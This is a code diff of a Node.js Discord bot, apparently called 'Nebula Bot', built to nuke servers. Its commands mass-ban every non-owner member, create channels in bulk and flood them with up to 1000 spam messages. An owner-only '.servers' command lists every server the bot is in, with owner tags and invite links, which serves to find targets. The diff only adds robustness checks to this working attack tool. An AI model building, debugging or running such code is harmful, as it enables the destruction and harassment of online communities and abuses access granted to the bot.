@@ -1,7 +1,6 @@
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
-
 dotenv.config();
 
 // ====== DISCORD BOT SETUP ======
@@ -19,11 +18,9 @@ const client = new Client({
 // ====== WEB SERVER FOR PORT 3000 ======
 const app = express();
 const PORT = process.env.PORT || 3000;
-
 app.get('/', (req, res) => {
   res.send('Nebula Bot is online and awaiting .rip command...');
 });
-
 app.listen(PORT, () => {
   console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
@@ -57,7 +54,6 @@ async function safeLeaveGuild(guild) {
       console.log('ℹ️ Cannot leave: Already left or guild unavailable');
       return;
     }
-
     await handleRateLimit(() => guild.leave());
     console.log('🚪 Successfully left the server.');
   } catch (err) {
@@ -78,7 +74,6 @@ client.on('messageCreate', async (message) => {
 
   const args = message.content.slice(1).trim().split(/ +/);
   const command = args[0].toLowerCase();
-
   const BLOCKED_GUILD_ID = '1345474714331643956';
 
   // ===== HELP COMMAND =====
@@ -96,10 +91,14 @@ client.on('messageCreate', async (message) => {
 
     try {
       await message.author.send({ embeds: [helpEmbed] });
-      await message.reply('📬 Sent help to your DMs!');
+      if (message.channel?.send) {
+        await message.reply('📬 Sent help to your DMs!');
+      }
     } catch (err) {
       console.error('❌ Could not send DM:', err.message);
-      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
+      if (message.channel?.send) {
+        await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
+      }
     }
     return;
   }
@@ -109,19 +108,17 @@ client.on('messageCreate', async (message) => {
     if (message.author.id !== '1336450372398612521') {
       return message.reply('❌ You are not authorized to use this command.');
     }
-
     const guilds = client.guilds.cache;
     const serverList = [];
-
     console.log(`📥 ${message.author.tag} requested .servers`);
-    await message.reply('📬 Fetching server list...');
-
+    if (message.channel?.send) {
+      await message.reply('📬 Fetching server list...');
+    }
     for (const [id, guild] of guilds.entries()) {
       try {
         const invites = await handleRateLimit(() => guild.invites.fetch());
         const firstInvite = invites?.first() || null;
         const owner = await handleRateLimit(() => guild.fetchOwner());
-
         serverList.push({
           name: guild.name,
           id: guild.id,
@@ -137,7 +134,6 @@ client.on('messageCreate', async (message) => {
         });
       }
     }
-
     const embed = new EmbedBuilder()
       .setTitle('🌐 Servers I\'m In')
       .setDescription(`Total: ${serverList.length}`)
@@ -157,28 +153,30 @@ client.on('messageCreate', async (message) => {
 
       if (serverList.length > 25) {
         for (let i = 25; i < serverList.length; i += 25) {
+          const page = serverList.slice(i, i + 25);
           const moreEmbed = new EmbedBuilder()
             .setColor('#00ffff')
             .setTitle(`🌐 Servers I'm In (Page ${Math.floor(i / 25) + 1})`);
 
-          const page = serverList.slice(i, i + 25);
           for (const server of page) {
             const value = server.error
               ? `ID: ${server.id}\n⚠️ ${server.error}`
               : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
             moreEmbed.addFields({ name: `${serverList.indexOf(server) + 1}. ${server.name}`, value });
           }
-
           await dmChannel.send({ embeds: [moreEmbed] });
         }
       }
 
-      await message.reply('✅ Server list sent to your DMs!');
+      if (message.channel?.send) {
+        await message.reply('✅ Server list sent to your DMs!');
+      }
     } catch (err) {
       console.error('❌ Failed to send DM:', err.message);
-      await message.reply('❌ Could not send DM. Make sure your DMs are open.');
+      if (message.channel?.send) {
+        await message.reply('❌ Could not send DM. Make sure your DMs are open.');
+      }
     }
-
     return;
   }
 
@@ -194,8 +192,9 @@ client.on('messageCreate', async (message) => {
     }
 
     const guild = message.guild;
+    const ownerID = guild.ownerId;
     const membersToBan = guild.members.cache.filter(m =>
-      m.id !== guild.ownerId && !m.user.bot
+      m.id !== ownerID && !m.user.bot
     );
 
     if (membersToBan.size === 0) {
@@ -203,6 +202,10 @@ client.on('messageCreate', async (message) => {
     }
 
     console.log(`🔪 Banning ${membersToBan.size} members...`);
+
+    if (message.channel?.send) {
+      await message.reply(`🔪 Banning ${membersToBan.size} members...`);
+    }
 
     for (const member of membersToBan.values()) {
       try {
@@ -218,7 +221,9 @@ client.on('messageCreate', async (message) => {
     }
 
     console.log(`✅ Successfully banned all members.`);
-    await message.reply(`✅ Banned ${membersToBan.size} members.`);
+    if (message.channel?.send) {
+      await message.reply(`✅ Successfully banned ${membersToBan.size} members.`);
+    }
     return;
   }
 
@@ -230,7 +235,6 @@ client.on('messageCreate', async (message) => {
 
     try {
       console.log(`🎯 Targeting server: ${guild.name}`);
-
       let didSomething = false;
       let sent = 0;
 
@@ -302,44 +306,40 @@ client.on('messageCreate', async (message) => {
       const batchSize = 25;
 
       console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);
-
       for (let i = 0; i < totalChannelsToCreate; i += batchSize) {
         const batchPromises = [];
-
         for (let j = 0; j < batchSize && (i + j) < totalChannelsToCreate; j++) {
           const index = i + j;
-
           const createChan = async () => {
             const channel = await handleRateLimit(() =>
               guild.channels.create({ name: `${channelName}-${index + 1}` })
                 .catch(e => console.warn(`Channel #${index + 1} failed:`, e.message))
             );
-
             if (!channel) return;
-
             console.log(`✅ Created channel: ${channel.name}`);
             createdChannels.push(channel);
             didSomething = true;
           };
-
           batchPromises.push(createChan());
         }
-
         await Promise.all(batchPromises);
-        await new Promise(r => setTimeout(r, 500)); // Small pause between batches
+        await new Promise(r => setTimeout(r, 500));
       }
 
       if (createdChannels.length === 0) {
         console.error('❌ No channels were created. Aborting spam.');
-        return message.channel.send('❌ Could not create any channels. Aborting.');
+        if (message.channel?.send) {
+          return message.channel.send('❌ Could not create any channels. Aborting.');
+        }
       }
 
       // Step 6: Spam 20 messages per channel, up to 1000 total
       const validChannels = createdChannels.filter(ch => ch && ch.id);
-
       if (validChannels.length === 0) {
         console.error('❌ No valid channels to spam.');
-        return message.channel.send('❌ No valid channels to spam.');
+        if (message.channel?.send) {
+          return message.channel.send('❌ No valid channels to spam.');
+        }
       }
 
       const MAX_MESSAGES = 1000;
@@ -356,11 +356,12 @@ client.on('messageCreate', async (message) => {
           } catch (err) {
             console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
           }
-          await new Promise(r => setTimeout(r, 2)); // Delay between sends
+          await new Promise(r => setTimeout(r, 2));
         }
       });
 
       await Promise.all(sendBatch.map(fn => fn()));
+
       console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
       didSomething = true;
 
@@ -373,15 +374,21 @@ client.on('messageCreate', async (message) => {
 
       if (!didSomething) {
         console.error('🚫 Could not perform any actions on this server.');
-        await message.channel.send('🚫 Could not perform any actions on this server.');
+        if (message.channel?.send) {
+          await message.channel.send('🚫 Could not perform any actions on this server.');
+        }
       } else {
         console.log('✅ Successfully completed operation.');
-        await message.channel.send('✅ Successfully nuked server.');
+        if (message.channel?.send) {
+          await message.channel.send('✅ Successfully nuked server.');
+        }
       }
 
     } catch (err) {
       console.error('🚨 Critical error during operation:', err.message);
-      await message.channel.send(`❌ Error occurred: ${err.message}`);
+      if (message.channel?.send) {
+        await message.channel.send(`❌ Error occurred: ${err.message}`);
+      }
     }
   }
 });
